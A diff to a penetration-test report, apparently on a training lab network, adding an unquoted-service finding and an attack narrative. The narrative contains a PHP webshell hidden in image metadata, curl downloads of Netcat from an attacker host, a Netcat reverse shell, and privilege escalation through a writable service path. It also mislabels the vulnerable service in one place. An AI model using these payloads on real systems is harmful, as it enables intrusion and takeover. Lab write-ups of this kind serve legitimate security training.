@@ -217,9 +217,22 @@ After gaining access to the webserver in **10.200.105.100**, the url **http://10
 If one of this filters is accepted, the file can be uploaded. The first filter can be bypassed by adding double extension. The screenshot below shows the upload of a PHP file, extension no allowed:
 ![Filter to upload files bypassed](image-13.png)
 
-
 **Recommendation**
 It is recommended to implement several filters that verify if the uploaded file matches the one expected by the application. Besides the extension, it is possible to check the file signature (a.k.a magic number), content-type and verify is no extra extensions has been added.
+
+## 8- Unqoted services on the personal computer
+**Severity**
+High
+**Description**
+On the personal computer, **10.200.105.100**, the service *SeImpersonatePrivilege* is running in a path without quotes as shown in the picture below:
+![Services not in c:\windows](image-18.png)
+
+Additionaly, it is possible to run this service with admin rights as shown below:
+![SERVICE_START_NAME](image-19.png)
+
+**Recommendation**
+Unquoted services allow attackers to pottentialy insert and/ort execute services than original ones. This creates a surface for privilege escalation which risks the confidentiality, integrity and availability of the system.
+
 # Narrative
 
 ## Service Enumeration
@@ -587,7 +600,6 @@ exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-pat.j
 Usin this methodology, we were able to upload a PoC that the filter can be bypassed:
 ![Filter to upload files bypassed](image-13.png)
 
-
 Once we got the PoC, our next step is to upload a file that will bypass the AV and execute command remotly. We uploaded the following PHP in the metadata of the PNG file:
 ```
 exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" test-path2.png.php
@@ -599,6 +611,72 @@ and
 ![Command: hostname](image-15.png)
 
 ### Creating Reverse Shell on the PC
+Since it is possible to execute commands on the **100.200.105.100** using a webshell, we uploaded an executable version ov Netcat, so we can generate a full reverse shell. To upload this executable, we sent the following commands to the webshell:
+```
+# Curl.exe to make sure that the tool is available on the target system
+http://10.200.105.100/resources/uploads/shell-pat.png.php?wreath=curl.exe
+
+# Upload nc.exe
+curl http://ATTACKER_IP:8001/nc.exe -o c:\\windows\\temp\\nc-USERNAME.exe
+
+curl http://10.50.106.78/nc64.exe -o c:\\windows\\temp\\nc-pat.exe
+```
+
+
+We sent then the following commands to create a shell:
+```
+# Listener on the attacking machine
+nc -lvnp 47555
+
+# Connecting the target to the attacking machine
+powershell.exe c:\\windows\\temp\\nc-pat.exe ATTACKER_IP 47555 -e cmd.exe 
+```
+
+net use \\10.50.106.78\share /USER:user 1234567
+copy \\10.50.106.78\share\winPEAS.ps1 %TEMP%\winPEAS-pat.ps1
+
+copy \\10.50.106.78\share\winPEAS.bat %TEMP%\winPEAS-pat.bat
+
+
+net use \\10.50.106.78\\share /del
+
+**Screenshot of uploaded file and reverse shell**
+
+### Escalate privilege on the PC
+Differently from the other two hosts, this one is running with a low privilege user. Our task here was to find other vulnerabilities points that allows to escalate to a privileged user.
+
+Running the *whomai /priv* and *whomai /group* gave us no point to escalate our user:
+![whomai /priv](image-16.png)
+
+![whomai /group](image-17.png)
+
+The following command identified the services that are not running on the folder *C:\Windows*:
+```
+wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+```
+The service *SystemExplorerHelpService* is unqoted. This create a small attacking service, in case this service is runned with admin privileges:
+
+![Services not in c:\windows](image-18.png)
+
+The next command showed us that the service
+```
+sc qc SystemExplorerHelpService
+```
+
+As shown below, this service is runned with admin rights:
+![SERVICE_START_NAME](image-19.png)
+
+The next step is to find out our permissions on the directory of this service:
+```
+powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+```
+
+The screenshot below shows that we have full access to the directory:
+![Permission on the directory where the service is running](image-20.png)
+
+To escale privileges, we uploaded a C# executable in the folder where the service *SystemExplorerHelpService* is placed. This executable will create a process to contact the attacking machine creating a reverse shell as admin, since this service starts with administrative privileges.
+
+![Windows shell with administrative privileges](image-21.png)
 
 
 ## Maintaining Access
